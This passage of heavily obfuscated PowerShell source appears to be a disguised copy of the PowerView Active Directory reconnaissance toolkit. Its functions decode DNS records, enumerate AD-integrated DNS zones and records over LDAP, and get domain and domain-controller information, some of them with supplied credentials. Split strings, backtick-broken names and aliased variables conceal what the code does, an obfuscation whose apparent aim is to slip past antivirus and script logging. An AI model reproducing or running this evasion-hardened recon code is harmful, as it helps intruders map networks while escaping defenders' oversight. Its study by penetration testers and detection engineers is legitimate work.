
        if (${p`S`B`oUNdPARam`e`TerS}[("{1}{2}{0}" -f'imeLimit','Serve','rT')]) {
            ${Sea`R`cher}."SE`R`V`ERti`MElIMIt" = ${sER`VErTiM`ELiM`It}
        }

        if (${p`SBOUn`dPaRA`meT`eRs}[("{0}{2}{1}"-f'T','ne','ombsto')]) {
            ${SE`ArC`HEr}."tOmbs`T`oNE" = ${t`RUE}
        }

        if (${Psb`oU`NDpa`RaMETerS}[("{1}{0}{2}"-f'DAPFil','L','ter')]) {
            ${SeArch`Er}."F`iLter" = ${Ld`Apf`iLt`er}
        }

        if (${P`SbOUN`Dp`ArAMEterS}[("{3}{0}{1}{2}"-f'ty','M','asks','Securi')]) {
            ${seA`R`c`hER}."SecUr`i`TyM`ASkS" = Switch (${s`ECurIt`YMASkS}) {
                ("{0}{1}"-f'D','acl') {   $Qt87w::"Da`cl" }
                ("{1}{0}" -f 'roup','G') {   (Ls  vARIaBle:Qt87W).vALue::"g`ROUP" }
                ("{1}{0}" -f 'ne','No') {   (  gi ('va'+'RIable:'+'QT8'+'7'+'w')).vAlue::"N`ONE" }
                ("{0}{1}"-f'Own','er') {   $qt87w::"OwN`ER" }
                ("{0}{1}" -f 'S','acl') {  (  geT-VaRIAble  qT87w  ).valUe::"S`ACL" }
            }
        }

        if (${PSB`O`UNDP`ARAmE`Te`RS}[("{2}{1}{0}" -f'ies','ert','Prop')]) {
            
            ${PRoPe`R`T`iEST`OlOad} = ${P`ROPER`TIEs}| &("{1}{0}{3}{2}" -f'ch','ForEa','t','-Objec') { ${_}.("{1}{0}"-f'lit','Sp').Invoke(',') }
            ${n`UlL} = ${Se`Ar`CHeR}."P`ROPE`Rt`IEStoLOAd".("{0}{2}{1}"-f 'AddRan','e','g').Invoke((${Pro`PeRtIE`sTol`oAd}))
        }

        ${seA`RCh`Er}
    }
}


function CONVerT`-`dnS`ReCorD {


    [OutputType({"{5}{4}{0}{1}{2}{3}{7}{6}" -f 'em.Manag','ement.Automati','on.PSC','ust','st','Sy','bject','omO'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTioN = 0, mANDAtORy = ${t`Rue}, vALuEfroMPIpeLiNEbYPRoPErtyNAmE = ${t`Rue})]
        [Byte[]]
        ${d`Ns`Re`CoRd}
    )

    BEGIN {
        function ge`T-n`Ame {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{4}{3}{1}{5}" -f'P','r','SUs','r','eOutputTypeCo','ectly'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${r`AW}
            )

            [Int]${LE`NgTH} = ${R`Aw}[0]
            [Int]${s`eGmen`TS} = ${r`AW}[1]
            [Int]${I`Nd`EX} =  2
            [String]${nA`me}  = ''

            while (${s`eg`meNTS}-- -gt 0)
            {
                [Int]${SeG`m`e`NTLENgTh} = ${r`AW}[${I`Nd`EX}++]
                while (${s`egmen`T`LEn`gTH}-- -gt 0) {
                    ${n`AmE} += [Char]${R`AW}[${i`N`Dex}++]
                }
                ${N`AMe} += "."
            }
            ${Na`mE}
        }
    }

    PROCESS {
        
        ${r`DATa`T`YPE} =   (GeT-VAriable  ('Sqp'+'Y8') -VaLuEo )::("{2}{1}{0}"-f '16','t','ToUIn').Invoke(${d`NSRecO`Rd}, 2)
        ${U`PDaTEdat`S`e`RiAL} =  (varIAbLe sqpy8).valUe::("{1}{0}{2}" -f'nt3','ToUI','2').Invoke(${d`Ns`REcoRd}, 8)

        ${TT`Lraw} = ${DnsRe`CO`Rd}[12..15]

        
        ${NU`lL} =  ( GEt-cHiLdItem varIAbLE:zp8c  ).vaLue::("{0}{2}{1}" -f 'R','rse','eve').Invoke(${TtL`RaW})
        ${t`TL} =   (  VARIABLE  ('sQP'+'y8')).vAlUe::("{1}{0}"-f't32','ToUIn').Invoke(${T`TlR`Aw}, 0)

        ${A`ge} =  (  cHILDIteM ("Va"+"riABl"+"e:sq"+"PY8")  ).ValUE::("{2}{1}{0}"-f 't32','oUIn','T').Invoke(${d`Ns`ReCoRd}, 20)
        if (${a`GE} -ne 0) {
            ${TiM`est`A`MP} = ((&("{2}{1}{0}" -f 't-Date','e','G') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{1}{0}{2}"-f'dHou','Ad','rs').Invoke(${a`ge})).("{1}{2}{0}"-f 'tring','T','oS').Invoke()
        }
        else {
            ${t`I`meSt`AMP} = ("{0}{1}{2}"-f'[','stati','c]')
        }

        ${d`NsrEC`ordObje`CT} = &("{1}{0}{2}" -f 'Ob','New-','ject') ("{1}{0}{2}"-f'SO','P','bject')

        if (${Rd`ATaTy`pE} -eq 1) {
            ${i`p} = "{0}.{1}.{2}.{3}" -f ${d`NSRe`cOrD}[24], ${d`NSr`E`coRD}[25], ${dnsr`E`Co`Rd}[26], ${DN`sr`eC`oRd}[27]
            ${D`ATa} = ${Ip}
            ${DnS`REC`oR`Dobj`ECt} | &("{2}{1}{0}"-f'r','dd-Membe','A') ("{0}{2}{1}" -f 'Notep','operty','r') ("{3}{2}{1}{0}"-f'rdType','o','ec','R') 'A'
        }

        elseif (${RDAt`A`TypE} -eq 2) {
            ${NS`Na`ME} = &("{0}{1}{2}" -f 'Get','-Na','me') ${dNSR`Ec`oRD}[24..${dn`SR`eCord}."L`ENg`TH"]
            ${D`ATa} = ${nSnA`ME}
            ${DnSR`eCOR`Do`Bj`EcT} | &("{3}{2}{1}{0}" -f 'r','e','-Memb','Add') ("{0}{2}{1}{3}" -f 'Notepr','r','ope','ty') ("{2}{0}{1}"-f 'cord','Type','Re') 'NS'
        }

        elseif (${r`dA`TATYpE} -eq 5) {
            ${A`lias} = &("{0}{1}{2}"-f'Get-','N','ame') ${d`NS`RecorD}[24..${dNsRe`co`RD}."Len`GTh"]
            ${Da`TA} = ${A`lIAs}
            ${DNSRe`COr`doBJE`ct} | &("{0}{1}{2}"-f'Add','-Me','mber') ("{1}{0}{3}{2}" -f'o','N','eproperty','t') ("{0}{2}{1}"-f 'Rec','rdType','o') ("{0}{1}"-f'CNAM','E')
        }

        elseif (${Rd`ATAt`ypE} -eq 6) {
            
            ${Da`Ta} = $( (  LS  variaBLE:sk6).vAlUE::"TOBA`SE`64STR`INg"(${D`NsRe`co`RD}[24..${DnSR`eC`ORD}."Len`G`TH"]))
            ${D`Nsreco`R`DO`BjeCT} | &("{1}{2}{0}"-f 'r','Add-Mem','be') ("{1}{0}{2}"-f'otepr','N','operty') ("{1}{0}{2}{3}" -f 'ecor','R','d','Type') 'SOA'
        }

        elseif (${rd`A`TAT`Ype} -eq 12) {
            ${p`Tr} = &("{1}{2}{0}"-f 'me','Get','-Na') ${D`NsREC`O`RD}[24..${DNS`RECO`RD}."L`En`gtH"]
            ${d`AtA} = ${P`TR}
            ${d`NsR`eCoR`d`oBJeCT} | &("{0}{1}{2}" -f 'Add-Mem','b','er') ("{0}{1}{2}"-f'Note','prop','erty') ("{0}{1}{2}" -f'RecordT','y','pe') 'PTR'
        }

        elseif (${RDat`At`Ype} -eq 13) {
            
            ${D`AtA} = $(  $sK6::"TO`BASe64`sTR`ING"(${dnSr`eC`ORd}[24..${DNS`R`ec`ord}."L`en`GtH"]))
            ${dNsrEcOrd`Ob`j`ect} | &("{1}{3}{2}{0}"-f 'r','Add','embe','-M') ("{2}{0}{1}{3}"-f'o','t','N','eproperty') ("{1}{0}{2}"-f'rdT','Reco','ype') ("{0}{1}"-f 'HI','NFO')
        }

        elseif (${r`Da`TaTYpE} -eq 15) {
            
            ${d`ATA} = $( ( gI ('VArIab'+'LE'+':sK6')).valuE::"Tob`ASe64sT`RiNG"(${D`Ns`REcORd}[24..${Dns`R`ec`Ord}."leNG`Th"]))
            ${dn`SR`E`CorD`oBjeCt} | &("{1}{2}{0}" -f'r','Ad','d-Membe') ("{2}{1}{3}{0}"-f 'rty','eprop','Not','e') ("{2}{1}{0}"-f 'pe','dTy','Recor') 'MX'
        }

        elseif (${R`Da`T`AType} -eq 16) {
            [string]${t`Xt}  = ''
            [int]${Se`GmeNT`lEn`gTH} = ${D`NS`RECo`RD}[24]
            ${i`NDEX} = 25

            while (${S`e`gMEntLEnGTH}-- -gt 0) {
                ${T`XT} += [char]${d`N`S`RECoRd}[${in`dEX}++]
            }

            ${dA`Ta} = ${T`XT}
            ${DN`SR`Ec`ORdoBj`ECt} | &("{1}{2}{0}" -f'ber','A','dd-Mem') ("{0}{2}{3}{1}"-f 'N','erty','ot','eprop') ("{2}{0}{1}"-f 'p','e','RecordTy') 'TXT'
        }

        elseif (${RDA`T`AtY`pe} -eq 28) {
            
            ${Da`Ta} = $( (  vArIaBLE  sK6 -vaLUeonL )::"TO`B`A`sE64S`TRInG"(${DNSR`Ec`ORd}[24..${DNS`R`Eco`Rd}."len`Gth"]))
            ${Dns`R`ecORdob`jeCT} | &("{2}{1}{0}"-f'er','emb','Add-M') ("{3}{2}{0}{1}" -f'rope','rty','otep','N') ("{1}{2}{3}{0}"-f 'rdType','R','e','co') ("{1}{0}" -f'A','AAA')
        }

        elseif (${r`DAtATY`Pe} -eq 33) {
            
            ${D`AtA} = $(  $sk6::"tOb`A`se64s`TR`Ing"(${dNs`Re`coRD}[24..${D`NSR`ecord}."LEn`gTh"]))
            ${dNSrEcoRD`O`BjeCT} | &("{0}{1}{2}"-f'Add-','Membe','r') ("{0}{2}{1}"-f 'Notepr','erty','op') ("{0}{1}{2}" -f'R','e','cordType') 'SRV'
        }

        else {
            ${dA`Ta} = $( (  gI vArIAble:Sk6 ).VaLUe::"T`ObaSE`64sTR`InG"(${d`NS`R`EcORd}[24..${dN`SrEC`oRD}."L`EnGth"]))
            ${dnSR`ecoRd`ObJ`ECt} | &("{2}{3}{1}{0}"-f'mber','e','Add-','M') ("{1}{0}{2}{3}"-f 'eprope','Not','rt','y') ("{1}{0}{2}"-f'cordTyp','Re','e') ("{0}{1}{2}" -f 'U','NKNO','WN')
        }

        ${DNsrECoRDO`Bj`Ect} | &("{2}{0}{1}{3}" -f'd-M','embe','Ad','r') ("{0}{2}{3}{1}"-f 'N','perty','ot','epro') ("{0}{1}{2}" -f 'Upd','atedAtSe','rial') ${uPdaTEDAt`seri`AL}
        ${dNsRECoRDOB`j`e`ct} | &("{0}{2}{1}"-f'Ad','mber','d-Me') ("{3}{0}{2}{1}"-f'o','operty','tepr','N') 'TTL' ${T`TL}
        ${DNSrECo`RD`obJ`e`Ct} | &("{2}{0}{1}" -f 'dd-Memb','er','A') ("{0}{2}{1}" -f 'N','property','ote') 'Age' ${a`ge}
        ${d`NSrEC`o`Rd`obJect} | &("{1}{2}{0}{3}"-f'b','Add-','Mem','er') ("{3}{1}{2}{0}"-f 'y','tepr','opert','No') ("{1}{0}{2}" -f 'eS','Tim','tamp') ${tIme`st`A`MP}
        ${DnsrE`c`or`doBje`ct} | &("{0}{1}{2}"-f 'Add','-Me','mber') ("{0}{1}{2}"-f 'Note','pro','perty') ("{1}{0}" -f'ta','Da') ${d`ATA}
        ${dn`S`RECor`DoB`JecT}
    }
}


function get-dom`AIn`d`NSZ`O`Ne {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}" -f 'ocess','SShoul','dPr','P'}, '')]
    [OutputType({"{2}{4}{3}{0}{1}"-f'o','ne','Power','ew.DNSZ','Vi'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITIoN = 0, vALUEfrOmpiPELINE = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}"-f 'ol','l','DomainContr','er'})]
        [String]
        ${serV`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`OPE`R`TIEs},

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SUltpagEs`I`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`E`RVErtiMElIMIT},

        [Alias({"{1}{2}{0}" -f'nOne','Re','tur'})]
        [Switch]
        ${fIn`Done},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`Ed`e`NTiAl} =  (  gET-vArIaBlE 0DsQR).VaLuE::"EM`PTY"
    )

    PROCESS {
        ${sE`A`RCHe`Ra`RgUMentS} = @{
            ("{2}{0}{1}"-f'e','r','LDAPFilt') = ("{3}{2}{0}{5}{1}{6}{4}" -f'ectClass=d','Z','obj','(','e)','ns','on')
        }
        if (${ps`B`oundpA`RamE`TerS}[("{1}{0}"-f 'main','Do')]) { ${seaRC`hERaR`GUMen`TS}[("{0}{1}" -f'Domai','n')] = ${Do`M`AIN} }
        if (${PSbo`UND`P`A`RAMEtErs}[("{0}{1}" -f'Se','rver')]) { ${SeArChe`R`ARg`Ume`NtS}[("{0}{1}" -f'Se','rver')] = ${se`R`VER} }
        if (${pSBOuNDp`Ar`Am`Et`ERS}[("{1}{3}{2}{0}"-f'ties','Pro','er','p')]) { ${Sea`RCHe`RArG`UMEnts}[("{2}{1}{0}{3}"-f'ie','ert','Prop','s')] = ${PR`OpERT`Ies} }
        if (${PsBOu`ND`P`Aram`EterS}[("{2}{0}{3}{1}"-f'a','eSize','ResultP','g')]) { ${SEA`R`Ch`ErargUM`eN`TS}[("{3}{2}{1}{0}"-f 'geSize','a','sultP','Re')] = ${R`Esult`p`A`GesIzE} }
        if (${P`SB`ounDP`ArAME`T`ERS}[("{3}{0}{2}{1}" -f 'erTi','it','meLim','Serv')]) { ${SE`Archer`Ar`gU`MentS}[("{3}{0}{2}{1}"-f 'TimeL','t','imi','Server')] = ${s`erVeRtI`ME`lIMit} }
        if (${pS`BOU`Nd`pARaMe`TErS}[("{0}{2}{1}"-f'Cred','al','enti')]) { ${s`e`ArChERa`Rgu`MENTS}[("{1}{2}{0}" -f 'ntial','Cr','ede')] = ${cR`eDe`NT`ial} }
        ${DnS`S`ea`RCHER1} = &("{2}{3}{1}{4}{5}{0}"-f'er','S','Ge','t-Domain','ear','ch') @SearcherArguments

        if (${d`NsSeArch`E`R1}) {
            if (${psboU`Nd`P`AramEt`erS}[("{0}{1}" -f'F','indOne')]) { ${R`EsULtS} = ${dn`sseaRchE`R1}.("{0}{2}{1}" -f'F','dOne','in').Invoke()  }
            else { ${Re`suL`TS} = ${DNSsearch`E`R1}.("{1}{0}"-f'll','FindA').Invoke() }
            ${rE`sUlTs} | &("{2}{1}{0}"-f 'bject','-O','Where') {${_}} | &("{0}{1}{2}" -f 'ForEac','h-Obj','ect') {
                ${O`UT} = &("{2}{0}{1}{4}{3}{5}" -f've','rt-L','Con','PProp','DA','erty') -Properties ${_}."Pr`oPeR`TiEs"
                ${o`UT} | &("{2}{1}{3}{0}" -f 'ember','dd','A','-M') ("{0}{1}{2}{3}" -f 'N','ote','Prop','erty') ("{0}{1}"-f 'Zon','eName') ${o`UT}."Na`mE"
                ${O`Ut}."psoBjE`cT"."Ty`pENaMeS".("{1}{2}{0}"-f'rt','Ins','e').Invoke(0, ("{0}{3}{2}{1}{4}" -f'Powe','DNSZon','ew.','rVi','e'))
                ${O`UT}
            }

            if (${ReSu`LTS}) {
                try { ${RE`sU`LtS}.("{1}{0}"-f'pose','dis').Invoke() }
                catch {
                    &("{2}{3}{0}{1}"-f 'bos','e','Write-Ve','r') ('['+'Get-DomainDF'+'SShar'+'e] '+'E'+'rr'+'or '+'disp'+'o'+'sing '+'o'+'f '+'t'+'he '+'Resu'+'lts'+' '+'obj'+'ect:'+' '+"$_")
                }
            }
            ${Dn`SSEa`R`CheR1}.("{0}{1}{2}" -f'di','spo','se').Invoke()
        }

        ${S`EA`RCHeRa`RGum`eNTS}[("{2}{0}{3}{1}"-f 'ch','Prefix','Sear','Base')] = ("{0}{5}{2}{3}{6}{1}{4}"-f'C','e','softDNS,DC=Do','mainDnsZo','s','N=Micro','n')
        ${dnsseA`R`c`HeR2} = &("{3}{0}{2}{1}"-f '-Doma','her','inSearc','Get') @SearcherArguments

        if (${dNSs`EaRc`HE`R2}) {
            try {
                if (${PS`Bo`U`NDPARAM`ETE`Rs}[("{1}{0}" -f'ndOne','Fi')]) { ${R`ESul`Ts} = ${d`NSS`e`ArCHeR2}.("{0}{1}"-f 'F','indOne').Invoke() }
                else { ${R`ESU`lTS} = ${dNS`sEa`R`CheR2}.("{0}{1}" -f 'Fin','dAll').Invoke() }
                ${R`esUL`TS} | &("{2}{0}{3}{1}"-f'r','Object','Whe','e-') {${_}} | &("{0}{2}{1}"-f'ForE','ch-Object','a') {
                    ${O`UT} = &("{3}{0}{1}{2}" -f 'Pr','oper','ty','Convert-LDAP') -Properties ${_}."PR`oPeRt`IEs"
                    ${o`UT} | &("{0}{2}{1}" -f 'A','-Member','dd') ("{3}{1}{0}{2}" -f 'ro','eP','perty','Not') ("{2}{0}{1}"-f'N','ame','Zone') ${O`UT}."n`AMe"
                    ${O`UT}."P`sob`jEcT"."TyPe`N`AMes".("{1}{0}{2}"-f'n','I','sert').Invoke(0, ("{0}{2}{1}{3}"-f'PowerV','ew.DN','i','SZone'))
                    ${O`UT}
                }
                if (${R`E`SulTs}) {
                    try { ${rEs`U`lTs}.("{0}{1}" -f 'dis','pose').Invoke() }
                    catch {
                        &("{0}{2}{1}"-f'Write-','bose','Ver') ('[Get'+'-Do'+'ma'+'inDN'+'SZone'+']'+' '+'Erro'+'r '+'dispo'+'s'+'ing '+'of'+' '+'th'+'e '+'Re'+'sults'+' '+'obj'+'ect'+': '+"$_")
                    }
                }
            }
            catch {
                &("{2}{3}{1}{0}" -f 'e','Verbos','Wri','te-') ((("{12}{14}{4}{8}{17}{16}{5}{13}{11}{10}{9}{2}{0}{15}{1}{7}{6}{3}" -f 'tDN',',','f','r','t-Do','Zone','DnsZoneswE','DC=Domain','ma','N=Microso','sing wErC','r acces','[G','] Erro','e','S','DNS','in')) -CRePlAce  'wEr',[CHaR]39)
            }
            ${DNss`Ear`c`heR2}.("{2}{0}{1}" -f's','e','dispo').Invoke()
        }
    }
}


function GET-`dO`mAInd`NsRE`COrD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{0}{1}{3}" -f 'houldPr','oces','P','s','SS'}, '')]
    [OutputType({"{1}{0}{5}{2}{3}{4}"-f'rView.D','Powe','c','or','d','NSRe'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItIoN = 0,  maNDAtOrY = ${tR`UE}, vaLUEfROmPipElINe = ${TR`Ue}, vALuEfROMpIPelInEbYpROpERTynamE = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Zon`ename},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}"-f 'ller','o','nContr','Domai'})]
        [String]
        ${s`E`RVEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`RO`pERTI`eS} = ("{3}{9}{8}{5}{6}{0}{10}{2}{11}{12}{1}{4}{7}" -f'ishe','en','ns','n','created,whench','disting','u','anged','e,','am','dname,d','rec','ord,wh'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSU`LT`p`AgESiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`VEr`TimelIMiT},

        [Alias({"{2}{0}{1}" -f 'n','e','ReturnO'})]
        [Switch]
        ${FiNd`O`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEd`ENtI`Al} =  (  ls VariAblE:0dsQR ).VaLUE::"e`MPTY"
    )

    PROCESS {
        ${S`EarCHERArG`UM`eN`TS} = @{
            ("{0}{1}{2}"-f'LD','APFilte','r') = (("{2}{1}{3}{0}"-f 'ode)','jectCl','(ob','ass=dnsN'))
            ("{1}{2}{3}{0}"-f 'refix','Searc','hBa','seP') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${psboUndP`A`RA`mE`TErS}[("{0}{1}" -f 'Doma','in')]) { ${S`E`ARchEraRGu`Men`Ts}[("{1}{0}" -f 'omain','D')] = ${DOm`A`IN} }
        if (${psbOUND`P`AR`A`M`EteRS}[("{1}{0}" -f 'r','Serve')]) { ${S`e`ArChEraR`GuMEnts}[("{0}{2}{1}" -f'Serv','r','e')] = ${sE`RVER} }
        if (${PS`BouN`DpARAm`E`Te`Rs}[("{1}{2}{0}" -f'es','Pro','perti')]) { ${s`ea`RCHERa`RGumen`TS}[("{2}{0}{1}{3}" -f'pert','ie','Pro','s')] = ${P`RoPE`RT`Ies} }
        if (${PSboU`NdpAraM`e`T`e`RS}[("{2}{3}{0}{1}" -f 'ageSi','ze','Resul','tP')]) { ${S`EaRc`hE`RARGuMENTS}[("{0}{1}{3}{2}" -f 'ResultP','ag','e','eSiz')] = ${r`eSuLT`p`AGeSI`ze} }
        if (${psbO`UNDpAR`AME`T`ERs}[("{2}{4}{3}{0}{1}"-f 'ver','TimeLimit','S','r','e')]) { ${SEArC`hERArGu`ME`Nts}[("{1}{0}{2}" -f'erT','Serv','imeLimit')] = ${S`ErVEr`TimEl`iM`it} }
        if (${Ps`BoUnD`P`A`RAMEterS}[("{0}{3}{2}{1}" -f 'Cr','l','a','edenti')]) { ${sEArCh`er`ARgu`mEnTS}[("{1}{2}{0}" -f 'ial','Cre','dent')] = ${CR`e`dENTI`Al} }
        ${D`NS`sEA`RchEr} = &("{0}{2}{3}{4}{1}" -f 'G','inSearcher','et','-Dom','a') @SearcherArguments

        if (${d`NsseaR`C`HER}) {
            if (${pSbOunD`Pa`Ramet`ERs}[("{0}{1}" -f 'F','indOne')]) { ${REs`U`Lts} = ${dns`S`E`ARChEr}.("{0}{1}" -f 'FindO','ne').Invoke() }
            else { ${r`Es`UlTS} = ${D`NsSear`Ch`eR}.("{2}{1}{0}" -f'll','indA','F').Invoke() }
            ${ReS`U`ltS} | &("{0}{1}{2}" -f 'Where-O','b','ject') {${_}} | &("{0}{4}{1}{3}{2}"-f'F','ach-','ct','Obje','orE') {
                try {
                    ${o`UT} = &("{1}{2}{0}{3}" -f'e','Conve','rt-LDAPProp','rty') -Properties ${_}."pROPE`RTI`Es" | &("{2}{1}{0}"-f'Object','lect-','Se') ("{1}{0}" -f 'me','na'),("{0}{2}{1}{3}{4}"-f 'd','g','istin','uishednam','e'),("{1}{0}"-f 'ord','dnsrec'),("{1}{2}{0}{3}" -f'ea','when','cr','ted'),("{3}{1}{0}{2}" -f 'han','enc','ged','wh')
                    ${O`Ut} | &("{2}{1}{0}"-f 'er','-Memb','Add') ("{3}{1}{2}{0}"-f'erty','t','eProp','No') ("{1}{0}"-f 'Name','Zone') ${Zon`E`Name}

                    
                    if (${o`Ut}."d`NsREC`oRD" -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${r`EcO`Rd} = &("{3}{5}{4}{0}{2}{1}"-f '-','rd','DNSReco','Conv','t','er') -DNSRecord ${O`Ut}."dNsr`e`cORD"[0]
                    }
                    else {
                        ${r`ecoRd} = &("{3}{1}{2}{0}{4}" -f 'D','t','-','Conver','NSRecord') -DNSRecord ${O`Ut}."Dn`SrECo`RD"
                    }

                    if (${re`cO`Rd}) {
                        ${reCO`Rd}."ps`OBjeCt"."PRo`P`ertIES" | &("{2}{0}{1}"-f 'Eac','h-Object','For') {
                            ${o`UT} | &("{1}{2}{0}" -f'ber','Add-M','em') ("{3}{0}{1}{2}" -f'oteProp','e','rty','N') ${_}."n`AMe" ${_}."VA`lUe"
                        }
                    }

                    ${o`UT}."p`Sobj`eCT"."tYP`e`NaMEs".("{0}{1}"-f 'I','nsert').Invoke(0, ("{1}{3}{2}{0}"-f'cord','Po','Re','werView.DNS'))
                    ${O`UT}
                }
                catch {
                    &("{3}{0}{2}{1}"-f'rite-Wa','ing','rn','W') ('[G'+'et'+'-Do'+'mainDNS'+'Re'+'cord]'+' '+'Error'+': '+"$_")
                    ${o`Ut}
                }
            }

            if (${r`EsU`lTs}) {
                try { ${rE`S`UlTS}.("{0}{2}{1}" -f 'd','pose','is').Invoke() }
                catch {
                    &("{2}{1}{0}"-f'bose','te-Ver','Wri') ('[Ge'+'t-'+'DomainD'+'NSRec'+'ord] '+'Erro'+'r'+' '+'dis'+'pos'+'ing '+'of'+' '+'the'+' '+'R'+'esu'+'lts '+'objec'+'t: '+"$_")
                }
            }
            ${D`Nsse`ARCHEr}.("{2}{0}{1}"-f 's','e','dispo').Invoke()
        }
    }
}


function Ge`T`-`DOmAiN {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(posITIon = 0, ValUeFrompipELine = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDEN`T`i`Al} =  ( iTem  ("Var"+"iaB"+"lE:"+"0DSQr")  ).VaLUE::"e`MPTY"
    )

    PROCESS {
        if (${PSBOUn`D`ParAm`E`TERS}[("{2}{1}{0}"-f'al','edenti','Cr')]) {

            &("{2}{0}{1}"-f'ite-Verb','ose','Wr') ("{4}{0}{1}{5}{7}{12}{10}{2}{6}{9}{3}{8}{11}"-f't','-Dom',' alter','denti','[Ge','ain]','na',' U','als for Get-D','te cre','ing','omain','s')

            if (${PSB`o`UNdpAramE`T`ErS}[("{1}{0}" -f'ain','Dom')]) {
                ${t`ArGeTdO`Ma`In} = ${D`OMAIN}
            }
            else {
                
                ${TArgE`TDomA`IN} = ${c`RE`DENt`iAL}.("{4}{0}{2}{1}{5}{3}" -f 'et','k','Networ','dential','G','Cre').Invoke()."do`MAiN"
                &("{3}{4}{0}{1}{2}"-f 'e-Ve','rbos','e','W','rit') ('[Get'+'-Do'+'main]'+' '+'E'+'xtr'+'acte'+'d '+'domai'+'n '+"'$TargetDomain' "+'from'+' '+'-Cr'+'ed'+'ential')
            }

            ${domA`I`NCo`NTeXt} = &("{2}{0}{1}"-f 'w-O','bject','Ne') ("{5}{2}{4}{7}{9}{8}{0}{6}{1}{3}"-f'Director','rectoryConte','Servi','xt','c','System.Directory','y.Di','es.A','ve','cti')(("{0}{1}"-f 'Do','main'), ${TA`Rg`ETd`oMAiN}, ${c`R`EDeNt`IAL}."u`s`eRNamE", ${c`ReDen`TIAL}.("{4}{0}{5}{2}{1}{3}"-f'Netwo','a','ti','l','Get','rkCreden').Invoke()."pasSWo`Rd")

            try {
                 $VEt::("{2}{1}{0}" -f 'in','etDoma','G').Invoke(${Doma`iN`Con`Text})
            }
            catch {
                &("{0}{1}{2}"-f 'Write','-Ver','bose') ('[Ge'+'t'+'-Domain] '+'T'+'he '+'spe'+'c'+'if'+'ied '+'d'+'omain '+"'$TargetDomain' "+'doe'+'s '+'no'+'t '+'exi'+'st, '+'c'+'ould '+'not'+' '+'b'+'e '+'contacte'+'d,'+' '+'there'+' '+('is'+'n'+'{0}t ')  -f  [chAr]39+'an'+' '+'ex'+'isting '+'tru'+'st, '+'o'+'r '+'th'+'e '+'spe'+'ci'+'fied '+'c'+'redential'+'s'+' '+'are'+' '+'i'+'nv'+'alid: '+"$_")
            }
        }
        elseif (${pS`BOuNdpA`Ra`M`ETErS}[("{0}{2}{1}"-f'Do','n','mai')]) {
            ${DO`mAin`c`ONT`EXt} = &("{0}{1}{2}"-f'Ne','w-','Object') ("{2}{6}{12}{13}{1}{3}{8}{11}{4}{5}{9}{0}{7}{10}" -f 'onte','rv','S','ices','D','i','ystem.Dir','x','.Act','rectory.DirectoryC','t','ive','ectory','Se')(("{0}{1}{2}" -f'Do','m','ain'), ${D`o`mAiN})
            try {
                  $Vet::("{1}{0}" -f'Domain','Get').Invoke(${DOMa`Inc`ON`TE`xT})
            }
            catch {
                &("{1}{2}{0}" -f'erbose','Writ','e-V') ('['+'G'+'et-Domai'+'n] '+'Th'+'e '+'s'+'pec'+'if'+'ied '+'d'+'om'+'ain '+"'$Domain' "+'does'+' '+'not'+' '+'ex'+'ist,'+' '+'could'+' '+'n'+'ot '+'be'+' '+'contacte'+'d,'+' '+'or'+' '+'th'+'ere '+('is'+'n{0}t ')-F  [char]39+'a'+'n '+'exist'+'ing'+' '+'trus'+'t '+': '+"$_")
            }
        }
        else {
            try {
                 $vEt::("{2}{1}{4}{0}{3}" -f 'e','etC','G','ntDomain','urr').Invoke()
            }
            catch {
                &("{0}{2}{1}" -f'Wri','erbose','te-V') ('[Get-D'+'omain'+'] '+'Er'+'ror '+'retri'+'evin'+'g '+'th'+'e '+'curren'+'t '+'domai'+'n'+': '+"$_")
            }
        }
    }
}


function Get`-doMai`NCo`N`TroLleR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{4}{2}" -f 'l','PSShou','s','d','Proces'}, '')]
    [OutputType({"{0}{3}{1}{2}"-f 'PowerV','ew.C','omputer','i'})]
    [OutputType({"{4}{10}{8}{5}{0}{6}{7}{11}{9}{2}{3}{1}" -f'ct','ller','tory.Doma','inContro','S','tem.Dire','ory','S','s','s.ActiveDirec','y','ervice'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTIoN = 0, VAlueFrompIPELINe = ${T`RUe})]
        [String]
        ${D`Oma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}"-f'e','roll','DomainCont','r'})]
        [String]
        ${s`Er`VeR},

        [Switch]
        ${LD`Ap},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREd`E`NTial} =  $0DSQR::"Em`pty"
    )

    PROCESS {
        ${argu`M`EnTs} = @{}
        if (${pSBO`UNd`parAmETe`RS}[("{1}{0}" -f 'omain','D')]) { ${AR`GU`meNTS}[("{0}{2}{1}"-f'Do','in','ma')] = ${d`O`MaiN} }
